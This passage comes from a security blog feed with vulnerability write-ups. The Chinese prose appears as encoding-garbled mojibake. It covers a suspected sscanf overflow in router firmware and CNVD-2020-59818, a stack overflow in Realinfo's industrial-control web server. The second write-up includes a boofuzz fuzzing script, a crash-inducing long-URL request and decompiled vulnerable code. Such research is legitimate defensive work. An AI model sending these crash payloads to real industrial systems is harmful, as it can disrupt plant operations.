<h2 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h2><h3 id="åŸºæœ¬ä¿¡æ¯-2"><a href="#åŸºæœ¬ä¿¡æ¯-2" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>æŠ«éœ²ä¿¡æ¯ï¼šæš‚æ— </p>
<h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¦–å…ˆå£°æ˜ï¼Œæˆ‘ä¸ç¡®å®šè¿™ä¸ªæ¼æ´èƒ½å¦è§¦å‘ï¼Œç›®å‰æš‚æ—¶æ²¡åŠæ³•æµ‹è¯•ã€‚</p>
<p>é—®é¢˜å‡ºç°åœ¨æ–°ç‰ˆæœ¬å›ºä»¶ä¸­(1.2.0.76)ï¼Œç”¨ IDA è¿›è¡Œåˆ†æï¼Œå®šä½åˆ°å‡½æ•° handle_requestï¼Œä»ç¬¬ 979 è¡Œå¼€å§‹ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(v109, <span class="string">&quot;?signature=&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v114 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(v11, v114)</span><br><span class="line">    &amp;&amp; !v102</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.gif&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.css&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.js&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.xml&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.png&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>(v109, <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">    &amp;&amp; !dword_42C9D8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v225 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v226, <span class="number">0</span>, <span class="keyword">sizeof</span>(v226));</span><br><span class="line">    <span class="built_in">memset</span>(v229, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">    sc_get_sn(&amp;v225, <span class="number">43</span>);</span><br><span class="line">    v226[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    v115 = <span class="built_in">strstr</span>(path, <span class="string">&quot;?signature=&quot;</span>);</span><br><span class="line">    <span class="built_in">sscanf</span>(v115 + <span class="number">11</span>, <span class="string">&quot;%s&quot;</span>, v229);            <span class="comment">// maybe vuln</span></span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœä¼ å…¥çš„è¯·æ±‚æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. URL ä¸­åŒ…å« ?signature=</span><br><span class="line">2. è¯·æ±‚ç±»å‹æ˜¯ GET </span><br><span class="line">3. URL ä¸­ä¸åŒ…å« currentsetting.htm ä»¥åŠä¸Šé¢å†™å‡ºçš„ä¸€äº›å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure></div>

<p>ç¨‹åºä¼šå…ˆç”¨ strstr å®šä½ ?signature&#x3D; çš„ä½ç½®ï¼Œç„¶åè·³è¿‡è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæ¥ç€ç”¨ sscanf å‡½æ•°å°†åç»­å†…å®¹æ‹·è´åˆ°å˜é‡ v229ã€‚</p>
<p>åœ¨æ‹·è´çš„è¿‡ç¨‹ä¸­æ²¡æœ‰åˆ¤æ–­æºå­—ç¬¦ä¸²é•¿åº¦ï¼Œå¯èƒ½ä¼šå¯¼è‡´æº¢å‡ºã€‚ä¸è¿‡ IDA è‡ªåŠ¨è¯†åˆ«ç›®çš„ç¼“å†²åŒºå¤§å°ä¸º 2500 å­—èŠ‚ï¼Œèƒ½å¦ä¼ å…¥è¿™ä¹ˆé•¿çš„ URL æš‚æ—¶æ— æ³•ç¡®å®šã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CNVD-2020-59818</title>
    <url>/2020/12/04/realinfo/</url>
    <content><![CDATA[<p>ç´«é‡‘æ¡¥ç»„æ€è½¯ä»¶æ˜¯æŸå·¥æ§ç³»ç»Ÿçš„ä¸Šä½æœºæ§åˆ¶è½¯ä»¶ï¼Œå®˜æ–¹ç½‘ç«™ï¼š<a class="link"   href="http://www.realinfo.com.cn/" >http://www.realinfo.com.cn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ­¤æ¼æ´å‘å¸ƒäº 2020-12-03ï¼ŒCNVD é“¾æ¥ï¼š<a class="link"   href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818" >https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<span id="more"></span>

<h2 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h2><p>æ¼æ´è¯„åˆ†ï¼šé«˜</p>
<p>æ¼æ´æè¿°ï¼šç´«é‡‘æ¡¥ç›‘æ§ç»„æ€è½¯ä»¶æ˜¯ä¸€æ¬¾ä¸“ä¸šçš„ç´«é‡‘æ¡¥ç›‘æ§ç»„æ€è½¯ä»¶ï¼Œé‡‡ç”¨C&#x2F;Sä½“ç³»ç»“æ„ï¼Œæ‹¥æœ‰æ•°æ®åº“å¤„ç†æŠ€æœ¯å’Œå›¾å½¢ç³»ç»Ÿã€‚ç´«é‡‘æ¡¥ç›‘æ§ç»„æ€è½¯ä»¶å­˜åœ¨è¿œç¨‹æ ˆæº¢å‡ºæ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´å¯¼è‡´webæœåŠ¡å´©æºƒã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><strong>å·¥æ§ç³»ç»Ÿç®€ä»‹</strong></p>
<p>å·¥æ§è®¾å¤‡å’Œä¸€äº›å¸¸è§çš„ IoT è®¾å¤‡æœ‰å¾ˆå¤šç›¸ä¼¼çš„åœ°æ–¹ï¼Œå·¥æ§ç³»ç»Ÿé€šå¸¸åˆ†ä¸ºä¸Šä½æœºå’Œä¸‹ä½æœºï¼Œä¸‹ä½æœºè´Ÿè´£ç›´æ¥æ§åˆ¶è®¾å¤‡æˆ–è€…è·å–è®¾å¤‡çŠ¶å†µï¼Œä¸€èˆ¬æ˜¯ä¸€äº› PLC æˆ–è€…å•ç‰‡æœºï¼Œå®ƒä»¬çš„è®¡ç®—èƒ½åŠ›è¾ƒå¼±ï¼Œåªè´Ÿè´£æ•°æ®çš„é‡‡é›†å’Œç®€å•æ§åˆ¶ã€‚</p>
<p>ä¸Šä½æœºå¯ä»¥ç›´æ¥å‘å‡ºæ“æ§å‘½ä»¤ï¼Œå……å½“æ§åˆ¶è€…çš„è§’è‰²ï¼Œé€šå¸¸ç”± PC æ„æˆã€‚</p>
<p>æˆ‘ä»¬åˆ†æçš„æ¼æ´å°±å‡ºç°åœ¨ä¸Šä½æœºæ§åˆ¶è½¯ä»¶ä¸­ï¼Œç´«é‡‘æ¡¥ç»„æ€è½¯ä»¶å®˜ç½‘å®£ç§°å…¶ç”¨æˆ·åŒ…æ‹¬ä¸­å›½çŸ³æ²¹ã€ä¸­å›½çŸ³åŒ–ã€ä¸­èˆ¹é‡å·¥ç­‰ã€‚</p>
<p>ç”±äºä¸Šä½æœºå……å½“æ•´ä¸ªç³»ç»Ÿçš„æ§åˆ¶ç®¡ç†è§’è‰²ï¼Œå…¶åœ°ä½æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œä¸€æ—¦æ¶æ„ç”¨æˆ·æŒæ¡äº†ä¸Šä½æœºçš„æ“æ§æƒé™ï¼Œå³å¯å¯¹æ•´ä¸ªç”Ÿäº§æµç¨‹è¿›è¡Œä¿®æ”¹ï¼Œè¿™å°†å¯¹å·¥ä¸šç”Ÿäº§é€ æˆæå¤§çš„å¨èƒã€‚</p>
<p>è½¯ä»¶ä¸‹è½½åœ°å€(ç´«é‡‘æ¡¥ç›‘æ§ç»„æ€è½¯ä»¶ V6.5)ï¼š<a class="link"   href="http://www.realinfo.com.cn/html/software/Realinfo/index.html" >http://www.realinfo.com.cn/html/software/Realinfo/index.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>ä¸‹è½½å®Œæˆä¹‹åè¿è¡Œ Setup.cmd å®‰è£…ã€‚</p>
<p>æ¼æ´æè¿°ä¸­æåˆ°äº†è§¦å‘æ¼æ´å°†å¯¼è‡´ web æœåŠ¡å´©æºƒï¼Œæˆ‘ä»¬å¯ä»¥å»å®˜æ–¹å¸®åŠ©æ–‡æ¡£ä¸­æŸ¥æ‰¾å…³äº Web æœåŠ¡çš„èµ„æ–™ï¼Œåœ¨<a class="link"   href="http://www.realinfo.com.cn/html/technology/technical/index.html" >è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>æœç´¢ Webï¼Œå¯ä»¥æ‰¾åˆ°ç›¸å…³æ–‡ç« ï¼š<a class="link"   href="http://www.realinfo.com.cn/html/technology/technical/342.html%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%85%B6%E4%B8%AD%E7%9A%84%E6%8F%8F%E8%BF%B0%EF%BC%8C%E8%BD%AF%E4%BB%B6%E7%9A%84" >http://www.realinfo.com.cn/html/technology/technical/342.htmlï¼Œæ ¹æ®å…¶ä¸­çš„æè¿°ï¼Œè½¯ä»¶çš„<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> Web åŠŸèƒ½ä¸»è¦ç”¨äºæ•°æ®å±•ç¤ºï¼Œå¯ä»¥å®æ—¶æŸ¥çœ‹æ‰€éœ€çš„ä¿¡æ¯ã€‚</p>
<p>å¸®åŠ©æ–‡æ¡£ä¸­æåˆ° Web å‘å¸ƒç¨‹åºæ˜¯æ ¹ç›®å½•ä¸‹çš„ WebSvr.exeï¼ŒåŒå‡»è¿è¡Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-1.png"
                     
                ></p>
<p>Web å‘å¸ƒæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ä½¿ç”¨ IISï¼ŒäºŒæ˜¯ç”¨è½¯ä»¶è‡ªå¸¦çš„ WEB æœåŠ¡å™¨ï¼Œè‡ªå¸¦çš„ Web æœåŠ¡é»˜è®¤è¿è¡Œåœ¨ 80 ç«¯å£ï¼Œåœ¨æµè§ˆå™¨ä¸­å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œé»˜è®¤çš„ Web ç›®å½•æ˜¯ç¨‹åºå®‰è£…è·¯å¾„ä¸‹çš„ DemoApp\DemoFunction(1024_768)\ï¼Œç”±äºè½¯ä»¶éœ€è¦è¿›è¡Œæ³¨å†Œï¼Œæš‚æ—¶æ— æ³•æ–°å»ºå·¥ç¨‹ã€‚æ­£å¸¸ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼ŒWeb ç›®å½•å¯ä»¥è‡ªè¡Œè®¾ç½®ã€‚</p>
<p>ç”¨æµè§ˆå™¨è®¿é—®çš„æ—¶å€™æŠ“åŒ…ï¼Œæ­£å¸¸çš„è®¿é—®è¯·æ±‚å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /StartLog.Txt HTTP/1.1</span><br><span class="line">Host: 192.168.136.130</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>

<p>æœåŠ¡å™¨å“åº”</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Server: MS-MFC-WebSvr/1.0</span><br><span class="line">Date: Fri, 04 Dec 2020 04:21:10 GMT</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Content-length: 62</span><br><span class="line">Last-Modified: Fri, 06 Apr 2007 00:09:06 GMT</span><br><span class="line"></span><br><span class="line">04 06 08:09 RestartProc C:\Program Files\RealInfo\WebSvr.EXE</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—®è®°å½•åœ¨æœåŠ¡ç«¯å¯ä»¥çœ‹åˆ°ã€‚</p>
<p>ç”±äºç¨‹åºä»£ç è¾ƒå¤šï¼Œå¹¶ä¸”æ˜¯æ ‡å‡†çš„ Web æœåŠ¡ï¼Œæ‰€ä»¥è€ƒè™‘å…ˆå¯¹å…¶è¿›è¡Œ fuzzï¼Œè¿™é‡Œç”¨åˆ°çš„å·¥å…·æ˜¯ boofuzzï¼Œå…³äº boofuzz çš„ä½¿ç”¨æ–¹æ³•ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°å¾ˆå¤šæ•™ç¨‹ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œç¼–å†™ fuzz è„šæœ¬å¦‚ä¸‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> boofuzz <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuck</span>():</span><br><span class="line">    session = Session(</span><br><span class="line">                sleep_time=<span class="number">0.2</span>,</span><br><span class="line">                target=Target(</span><br><span class="line">                connection=TCPSocketConnection(<span class="string">&quot;192.168.136.130&quot;</span>, <span class="number">80</span>)</span><br><span class="line">                ))</span><br><span class="line">    s_initialize(name=<span class="string">&quot;Request&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&quot;Request-Line&quot;</span>):</span><br><span class="line">        <span class="comment"># LINE 1</span></span><br><span class="line">        s_static(<span class="string">&quot;POST&quot;</span>, name=<span class="string">&quot;Method&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot; &quot;</span>, name=<span class="string">&#x27;space-1&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;/aaaa&#x27;</span>, name=<span class="string">&#x27;URI&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot; &quot;</span>, name=<span class="string">&#x27;space-2&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;HTTP/1.1&#x27;</span>, name=<span class="string">&#x27;HTTP-Version&#x27;</span>)   </span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 2</span></span><br><span class="line">        s_static(<span class="string">&quot;Host&quot;</span>, name=<span class="string">&quot;Host&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;192.168.1.1&quot;</span>, name=<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># LINE 3</span></span><br><span class="line">        <span class="comment"># cookie pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 4</span></span><br><span class="line">        s_static(<span class="string">&#x27;Origin&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;http://192.168.1.1&#x27;</span>, name=<span class="string">&#x27;orogin&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 5</span></span><br><span class="line">        s_static(<span class="string">&#x27;Content-Type&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>, name=<span class="string">&#x27;content-type&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 6</span></span><br><span class="line">        s_static(<span class="string">&#x27;User-Agent&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36&#x27;</span>, name=<span class="string">&#x27;user-agent&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 7</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>, name=<span class="string">&#x27;accept&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 8</span></span><br><span class="line">        s_static(<span class="string">&#x27;Referer&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;http://192.168.1.1/weblogin.htm&#x27;</span>, name=<span class="string">&#x27;referer&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 9</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept-Encoding&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;gzip, deflate&#x27;</span>, name=<span class="string">&#x27;accept-encoding&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 10</span></span><br><span class="line">        s_static(<span class="string">&#x27;Accept-Language&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>, name=<span class="string">&#x27;accept-language&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># LINE 11</span></span><br><span class="line">        s_static(<span class="string">&#x27;Connection&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;close&#x27;</span>, name=<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> s_block(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        s_static(<span class="string">&#x27;aa=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;aa&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;&amp;ab=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;ab&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">        s_static(<span class="string">&#x27;&amp;ac=&#x27;</span>)</span><br><span class="line">        s_string(<span class="string">&#x27;ac&#x27;</span>, max_len=<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    session.connect(s_get(<span class="string">&quot;Request&quot;</span>))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line">fuck()</span><br></pre></td></tr></table></figure></div>

<p>boofuzz å…è®¸è®¾ç½®ç›‘è§†å™¨ï¼Œå¯ä»¥åœ¨æ¯æ¬¡ fuzz ä¹‹åæ£€æŸ¥ç¨‹åºæ˜¯å¦è¿è¡Œæ­£å¸¸ï¼Œç”±äºç›®æ ‡ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰ç¼–å†™ç›‘è§†å™¨ï¼Œæ‰‹åŠ¨æ¥æ£€æµ‹ä¹Ÿå¯ä»¥ã€‚</p>
<p>è¿è¡Œä¹‹å Web æœåŠ¡ç«‹åˆ»å°±ä¼šå´©æºƒï¼Œä¿¡æ¯å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-2.png"
                     
                ></p>
<p>é”™è¯¯ä»£ç  c0000409 å±äºå†…å­˜è®¿é—®é”™è¯¯ï¼Œè¿™é‡Œå¯ä»¥ç¡®å®šç¨‹åºä¸­ç¡®å®å­˜åœ¨ä¸€äº›å†…å­˜è¶Šç•Œé—®é¢˜ã€‚</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°èƒ½å¤Ÿç¨³å®šè§¦å‘æ¼æ´çš„ POC å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-3.png"
                     
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /&lt;payload&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.136.130</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ payload å¤„æ’å…¥è¶…é•¿çš„å­—ç¬¦ä¸²å¯ä»¥å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p>
<p>æ¥ä¸‹æ¥è¦åˆ¤æ–­å´©æºƒçš„åŸå› ï¼Œç»å°è¯• OD ä¸èƒ½æ­£ç¡®çš„æ•è·åˆ°å¼‚å¸¸ä¿¡æ¯ï¼Œéœ€è¦ä½¿ç”¨ IDA è°ƒè¯•ã€‚</p>
<p>IDA è¿è¡Œç¨‹åºä¹‹åå‘é€ payloadï¼Œæç¤ºå¼‚å¸¸ä¿¡æ¯å¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-4.png"
                     
                ></p>
<p>ç¨‹åºè®¿é—®äº†éæ³•åœ°å€ 0x00190000ï¼Œä¸­æ–­ä½ç½®ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/realinfo-5.png"
                     
                ></p>
<p>edx å°±æ˜¯éæ³•åœ°å€ã€‚ç”±äºä¸­æ–­ä½äº kernel32.dll ä¸­ï¼ŒçŒœæµ‹æ˜¯æŸä¸ªç³»ç»Ÿ API å‡½æ•°ï¼Œæƒ³è¦å®šä½ç”¨æˆ·ç¨‹åºä¸­å“ªé‡Œè°ƒç”¨äº†æ­¤å‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œæ ˆå›æº¯ï¼Œé¦–å…ˆæ‰¾åˆ° EBP çš„å€¼ä¸º 0018EDE0ï¼ŒæŸ¥çœ‹è¿”å›åœ°å€ 0018EDE4 å†…å®¹ä¸º </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0018EDE4  0040297E  sub_4028A0:loc_40297E</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±æ‰¾åˆ°äº† Web æœåŠ¡å™¨ä¸­å¯èƒ½å­˜åœ¨é—®é¢˜çš„ä»£ç æ®µï¼Œåœ¨ IDA ä¸­è½¬åˆ°åœ°å€ 0040297Eï¼Œå‘ç°è¿™é‡Œçš„ä»£ç æ²¡æœ‰è¢«æ­£å¸¸è¯†åˆ«ä¸ºå‡½æ•°ï¼Œåœ¨åœ°å€ 004028A0 æŒ‰ P é”®åˆ›å»ºå‡½æ•°ï¼ŒF5 å°±å¯ä»¥çœ‹åˆ°åç¼–è¯‘ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __stdcall <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR *v4; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">12</span>) &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(a1 + <span class="number">44</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( *(a1 + <span class="number">20</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">16</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(v3 + <span class="number">32</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = CTime::Format(v3 + <span class="number">20</span>, &amp;a1, <span class="number">57347</span>);</span><br><span class="line">          lstrcpyA(*(v2 + <span class="number">32</span>), *v4);</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">          CString::~CString(&amp;a1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(v3 + <span class="number">32</span>) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = CTime::Format(v3 + <span class="number">20</span>, &amp;v6, <span class="number">57347</span>);</span><br><span class="line">          lstrcpyA(*(v2 + <span class="number">32</span>), *v5);</span><br><span class="line">          v7 = <span class="number">-1</span>;</span><br><span class="line">          CString::~CString(&amp;v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        lstrcpyA(*(a1 + <span class="number">32</span>), *(v3 + <span class="number">12</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

